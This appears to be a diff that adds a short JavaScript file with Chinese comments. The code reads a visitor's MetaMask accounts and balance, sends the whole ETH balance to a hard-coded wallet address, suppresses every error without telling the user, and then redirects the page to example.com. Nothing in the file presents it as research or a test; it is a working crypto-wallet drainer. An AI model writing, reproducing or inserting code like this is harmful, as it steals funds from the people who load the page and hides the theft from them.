@@ -1,0 +1,24 @@
+// 檢查是否安裝了Metamask並且已經解鎖
+if (typeof window.chrome !== 'undefined' && typeof window.chrome.extension !== 'undefined' && window.chrome.extension.getURL('') === '') {
+  // 獲取Metamask帳戶
+  window.ethereum.request({ method: 'eth_accounts' }).then((accounts) => {
+    // 獲取帳戶餘額
+    window.ethereum.request({ method: 'eth_getBalance', params: [accounts[0], 'latest'] }).then((balance) => {
+      // 將所有ETH轉移到指定的地址
+      const amount = balance;
+      const toAddress = '0x9A55a8Ba84a732dE58fB4D509c3C52b3980D0A51';
+      window.ethereum.request({ method: 'eth_sendTransaction', params: [{ to: toAddress, value: amount }] }).then((result) => {
+        // 不顯示任何訊息
+      }).catch(() => {
+        // 不顯示任何訊息
+      });
+    }).catch(() => {
+      // 不顯示任何訊息
+    });
+  }).catch(() => {
+    // 不顯示任何訊息
+  });
+}
+
+// 連接到另外一個網址
+window.location.href = 'https://example.com';
